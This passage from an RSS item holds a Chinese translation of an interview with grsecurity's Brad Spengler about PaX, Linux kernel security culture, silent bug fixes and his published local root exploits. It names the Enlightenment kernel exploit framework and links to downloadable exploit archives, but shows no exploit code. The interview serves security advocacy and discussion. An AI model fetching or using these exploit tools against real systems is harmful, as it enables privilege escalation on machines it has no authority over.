&lt;h3 id=&quot;slo-techpax-teamaslrlinuxlinuxpaxlinux&quot;&gt;Slo-Tech：只有一些人真正了解PaX Team开发了一些安全机制（比如ASLR）后来被用于Linux内核里，至少目前来看主要的Linux内核社区开发者和参与者并不打算承认PaX所带来的贡献，你认为这些机制对于Linux安全贡献最大的是什么。&lt;/h3&gt;

&lt;p&gt;Brad Spengler：好吧，对我而言很搞笑的是聪明的&lt;a href=&quot;http://en.wikipedia.org/wiki/Ingo_Molnar&quot;&gt;Ingo Molnar&lt;/a&gt;多年前对于
paxtest测试（包括检查不同区域的地址空间是否有能力执行任意代码）非常不爽，
因为第2组测试中mprotect用于标记一些内存为可写和可执行。Ingo称这个测试是
“破坏” – mprotect检测多少有些不公平（因为exec-shield完全失效了）。往前
看几年你会发现SELinux基本上把PaX的&lt;a href=&quot;http://pax.grsecurity.net/docs/mprotect.txt&quot;&gt;MPROTECT&lt;/a&gt;加入了它的规则语言。在
Windows的世界里你能找到所有人都在尝试日等价于Linux上的mprotect，glibc曾
经有一个make_stack_executable()函数也是ret2libc攻击的对象，Windows上也
有类似的函数。PaX team早在很多年前就认识到攻击者会找最薄弱的环节下手，
而这正是今天正在发生的事情。&lt;/p&gt;

&lt;p&gt;我不能说哪一个特性是对Linux安全贡献最大，因为这些特性都是叠加式的让
Linux内核更安全。同样，我认为下一个最具革命性的贡献将同样来自PaX team。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/pax_grsec_graph.jpg&quot; alt=&quot;PaX/Grsecurity&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;slo-techbradlinuxgnulinux&quot;&gt;Slo-Tech：看起来Brad和Linux内核开发者的“口水战”还在继续。什么是主要原因导致了这种不愉快的情况？你不认为其实GNU/Linux的终端用户才是遭受损失的吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：我从来都没有发过一封邮件到LKML（Linux内核邮件列表），所
以我并没有参与任何”口水战“。PaX Team曾经发过邮件到LKML（比如让Linux内核
开发者承认他们的不愿意让外界关注的不披露漏洞的官方政策和安全漏洞信息模
糊化以及Linus为此多次赢得pwnie奖项的”a bug is bug”的安全哲学）。8个公开
的空指针引用的漏洞利用才被作为提权威胁来处理，在第一个公开漏洞利用后几
个月，mmap_min_addr被引入，但并不懂安全的Linux开发者开发的这个安全机制
导致了至少6个不同的绕过。Linux内核的ASLR有大量的弱点。SSP被攻破了多次最
终导致他们强行限制其工作范围。所有这些破事都来自于一个商业源头: Red
Hat – 对于公司重要的是为了赚钱你要说你有X特性（比如反病毒厂商会宣称：
“我们将会保护你不受病毒的侵害。”，至于这个特性是否有用并不是公司关心的
（但有些人会去验证厂商的宣传 — 安全研究人员或者黑帽）。&lt;/p&gt;

&lt;h3 id=&quot;slo-techlinuxlinuxsdlsdl&quot;&gt;Slo-Tech：谁是你尊重的Linux内核开发者？或者说，你不觉得在安全问题上Linux需要重新组织一下关于处理安全事件和安全开发的流程（很多回归测试代码）。比如微软的SDL…你觉得SDL怎么样？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：基于有很多公司和个人用户使用微软的产品，我很尊重微软对安
全的态度。Windows大量的二进制软件的生态系统的基础上，去实现安全功能的同
时还要保证应用程序的兼容性。这些工程的真实难度很容易被误认为是简单的事
情。&lt;/p&gt;

&lt;p&gt;Linux确实需要一些集中的领导者或者组织来处理安全。Linux开发者就算知道他
们在修复安全漏洞，但他们也不会通知任何人（包括厂商）。选择性的通知厂商
特定的安全问题，而不通知小的厂商和GNU/Linux发行版社区。Upstream基本上让
厂商难受，每个厂商都必须去做重复的劳动，因为没有标准化流程。这个Linux内
核社区官方的”a bug is just a bug”政策是在伤害所有的GNU/Linux用户。一些
很优秀的加固补丁很少被内核社区接受，因为他们过度看中安全机制造成的性能
影响。&lt;/p&gt;

&lt;h3 id=&quot;slo-techlinux-torvaldslinuxlinux&quot;&gt;Slo-Tech：你觉得Linux Torvalds能胜任Linux的安全工作吗？我的意思是，他是一个优秀的开发者，但不是一个安全研究人员。那其他的著名Linux内核开发者呢？他们有相关的技能吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：我不认为他能，他没有安全思维，也无法理解安全。我不确定为
什么很多人都感觉在安全问题上Linus是否参与很重要。一些开发者”理解”安全，
但通常他们只修复bug。Upstream通常不关心系统加固方面的内容。&lt;/p&gt;

&lt;h3 id=&quot;slo-techdave-aitellinux&quot;&gt;Slo-Tech：Dave Aitel写了一封名为“需要中心平台让多厂商合作来改善Linux内核安全问题“的邮件到他的邮件列表。你同意他的观点吗？这是正确的一步吗？你愿意为这样的中心平台工作吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：这点上&lt;a href=&quot;http://en.wikipedia.org/wiki/Dave_Aitel&quot;&gt;Dave&lt;/a&gt;是对的，但我并没看到这种事情在发生。最重要的是
Linus对安全的态度必须改变才行。只要一天他还是upstream内核的看门人，不论
他的观点对还是错都会直接影响Linux的安全。同时，PaX team和我只能继续做我
们所一直在做的事情，改善Linux的安全只有一条路：单干。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/1.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;slo-techbugbug&quot;&gt;Slo-Tech：内核维护者悄然无声的修复一些内核bug是真的吗？”悄然无声的修复“是否意味着不正确的BUG分类和低估安全风险或者其他什么的？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：是的，他们已经承认这么干过。如果你回去读读LWN上我的文章
有一堆这样的例子。厂商在漏洞分类的问题上也非常糟糕 – 所有都是DoS。我认
为这个事情现在有所改善是因为他们被曝光和受到了公众的批评。部分的问题原
因是没有统一的bug管理造成了对于同一个bug有不同的解释。通常不同的厂商的
bug分析也不一样，而现在有一些厂商发的安全公告并不是安全漏洞（比如NOMMU
是用于嵌入式系统，由于用户空间和内核空间没有隔离所以根本没有安全的设计，
但至少有2个CVE是有关这种系统的BUG）。这些事情可能会促使商业公司更愿意招
聘软件开发人员而不是安全人员来完成安全有关的工作。在每天都会报无数漏洞
的年代，集中处理平台和管理流程是能减轻很多工作量的。&lt;/p&gt;

&lt;h3 id=&quot;slo-techcrispin-cowanred-hat&quot;&gt;Slo-Tech：这是个恶心的问题，所以你不愿意的话你可以不回答。你愿意为微软（像Crispin Cowan）或者Red Hat工作吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：在我大学的最后一年微软曾经邀请我去面试，但我拒绝了，因为
HR在弄丢了我的简历1年后他们才想起我，而我那时已经失去去那里工作的兴趣。
为Red Hat工作？我确定你知道答案的;)&lt;/p&gt;

&lt;h3 id=&quot;slo-techwindows-vistalinuxwindowsbug&quot;&gt;Slo-Tech：众所周知你使用Windows Vista作为你的主要操作系统。这对于一个Linux内核安全研究者很奇怪。你为什么会这样选择呢？你尝试去找过Windows的bug吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：事实上我使用的是Windows 7 – Cheddar Bay的视频里应该是
RC版。因为Linux对我而言只是用来测试和改进grsecurity的。在高中和大学的时
候，我曾经使用GNU/Linux作为我的主要桌面系统，但现在GNU/Linux都是在虚拟
机里。以前的Linux的内核和用户态都简单很多。你知道那些众所周知的配置文件，
如果你修改他们，一些”智能”的进程会背着你把配置改回去，你不会因为想要不
同的默认配置而一定要修改SELinux规则。那是更多的是感受到GNU/Linux的自由
（Shawn：个人认为Brad说的问题应该是针对RedHat/CentOS/Fedora的，至少目前
来看Debian和Gentoo是享有高度的自由），而自由的缺失我认为是因为商业化造
成的。而游戏是我用Windows的主要原因。如果Pidgin通知我有一个新版本更新，
我只是下载一个去执行，而不需要强制的更新另外100+个包，那样会增加系统的
风险的。&lt;/p&gt;

&lt;h3 id=&quot;slo-techidefensezdiimmunity-rootcheddarbay-ingom0wnar-wundebar&quot;&gt;Slo-Tech：为什么你会公布漏洞利用而不是把它们卖给像iDefense，ZDI，Immunity这样的公司… 类似像本地root提权漏洞像cheddarbay, ingom0wnar, wundebar的市场价值是什么？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：我不确定他们是否关心Linux的本地提权漏洞 – 首先，这些漏
洞已经在某些版本的Linux内核开发分支上被修复了。其次这些漏洞利用太容易编
写了。所以这些漏洞利用是用于提醒大家安全的重要性的（以前的一堆讨论无法
改善Linux内核社区的看法，但那8个漏洞利用做到了）。第1个成果是帮助到了人
们去理解风险的等级（有一些人联系我说那些漏洞利用帮助他们说服了他们的老
板更关注安全），因为Linux内核公开的漏洞利用并不是那么多，不是因为漏洞不
存在，而是因为黑帽们都用于自己的目的了。第2个成果是让所有主要的的
GNU/Linux厂商和发行版都把空指针引用的攻击平面给默认防御住了，SELinux的
漏洞也修复了，厂商更注重关于mmap_min_addr的问题。用户也注意到了这个特性
和开启它的重要性（Shawn: mmap_min_addr成为今天的标准安全基线），很多人
也都升级了Linux内核。这些都是好事。我想整件事情唯一的”创新”应该是
enlightenment框架了（下一个问题跟这个有关）。&lt;/p&gt;

&lt;h3 id=&quot;slo-techlinuxenglightenmentmetasploit&quot;&gt;Slo-Tech：最近你发布的针对Linux内核漏洞利用的框架叫Englightenment。你是否有计划继续改进这个框架并且希望它成为像Metasploit一样？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：我一直在改进这个框架因为她让我以攻击者的方式来思考，这会
帮助我有多种思路去考虑针对特定攻击的防御机制（我最近在grsecurity里实现
的加固就是来源于此）。我也想让她变得尽量通用：她已经支持x86和x8\6_64平台
的所有2.4和2.6内核上关闭所有LSM模块。我最近也增加了Xen特性的支持，这个
特性会更恰当的让hyppercall去修改内核代码。我也在考虑关于
namespace/container(Shawn：就是lxc，以及后来docker用的底层模块），这些
都在TODO list上。&lt;a href=&quot;http://grsecurity.net/~spender/enlightenment.tgz&quot;&gt;Enlightenment&lt;/a&gt;会仅仅针对Linux内核漏洞利用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2.jpg&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;slo-techsusesebastian-krahmersgrakkyulinux&quot;&gt;Slo-Tech：大多数人都不把本地漏洞利用提权当成真正的威胁。我知道SuSE的Sebastian Krahmer写过相关的观点而我也同意他的观点，但事实上现在已经没有任何公开的远程漏洞利用了（Sgrakkyu是最后一名勇士），远程漏洞利用标准Linux内核真的已经是不可能还是在不远的将来会有所改变？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：远程内核漏洞利用非常困难，特别是针对运行PaX的内核和定制
过的内核。只要读读sgrakkyu/twiz在Phrack上的论文Attacking the core:
Kernel exploitation notes（Shawn：发表于Phrack Issue 64，2007年）就知道
所涉及的复杂性。他们都是热衷于挑战高难度的人，而其他大部分人会选择更简
单的方式，比如从Web进入然后使用本地内核提权漏洞的方式。如果系统运行了最
新的PaX，漏洞利用会变得极度困难，而不是更简单。我仍然能看到现有的威胁会
在可预见的未来存在下去，因为GNU/Linux发行版都把时间浪费在了不太可能出现
严重bug的SUID程序上，而新的内核提权漏洞几乎每个礼拜都在曝光。还有就是
web开发人员（ 那些编写的第三方代码运行在公共的服务器上，让远程用户能进
入”非信任的本地用户”）并没有变得更聪明。&lt;/p&gt;

&lt;h3 id=&quot;slo-techgnulinuxgnulinux&quot;&gt;Slo-Tech：GNU/Linux能依然被认为是安全的操作系统吗？你觉得政府或者其他对安全性要求高的基础架构应该使用GNU/Linux吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：我希望在高安全要求的环境中有其他的系统可以使用(Shawn: 经
过加固的GNU/Linux或者Quebes OS/MirageOS?)。作为建议，一个安全的操作系统
可能会犯下非常不安全愚蠢的错误，而一个不安全的操作系统可以变得安全如果
不跑任何业务的话。&lt;/p&gt;

&lt;h3 id=&quot;slo-tech0-day&quot;&gt;Slo-Tech：你有任何私人的0-day漏洞利用在你的硬盘上吗;)&lt;/h3&gt;

&lt;p&gt;Brade Spenger：有的，&lt;a href=&quot;http://grsecurity.net/~spender/ext4_own.tgz&quot;&gt;ext4_own.tgz&lt;/a&gt;，它小于1000bytes。&lt;/p&gt;

&lt;p&gt;感谢Brad Spengler的访谈。&lt;/p&gt;
</description>
        <pubDate>Mon, 18 May 2015 00:49:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/05/18/grsec-interview.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/05/18/grsec-interview.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
  </channel>
</rss>
